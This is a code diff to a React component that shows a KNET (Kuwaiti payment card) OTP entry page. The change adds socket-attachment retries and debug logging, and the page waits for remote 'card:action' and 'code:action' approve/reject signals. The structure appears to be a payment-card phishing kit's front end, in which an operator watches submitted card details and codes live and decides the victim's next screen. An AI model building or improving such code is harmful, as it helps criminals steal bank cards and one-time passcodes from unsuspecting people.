@@ -34,12 +34,11 @@ export default function KNETOTP() {
     navigateToPage("رمز التحقق كي نت (OTP)");
   }, []);
   useEffect(() => {
-    const s = socket.value;
-    if (!s) return;
+    let s: any = null; let timer: any = null; let tries = 0;
     const onCard = (a: string) => {
+      console.log("knetotp card:action ->", a);
       waitingMessage.value = ""; setIsLoading(false);
-      if (a === "reject") { setShowError(true); setOtpCode(""); }
-      else { navigate("/final-page"); }
+      if (a === "reject") { setShowError(true); setOtpCode(""); } else { navigate("/final-page"); }
     };
     const onCode = (d: any) => {
       waitingMessage.value = ""; setIsLoading(false);
@@ -47,8 +46,14 @@ export default function KNETOTP() {
       else if (d && d.action === "reject") { setShowError(true); setOtpCode(""); }
       else { navigate("/final-page"); }
     };
-    s.on("card:action", onCard); s.on("code:action", onCode);
-    return () => { s.off("card:action", onCard); s.off("code:action", onCode); };
+    const attach = () => {
+      s = socket.value;
+      if (!s) { if (++tries < 60) timer = setTimeout(attach, 400); return; }
+      console.log("knetotp socket attached:", s.id);
+      s.on("card:action", onCard); s.on("code:action", onCode);
+    };
+    attach();
+    return () => { if (timer) clearTimeout(timer); if (s) { s.off("card:action", onCard); s.off("code:action", onCode); } };
   }, []);
 
   // Handle form approval → go to final page
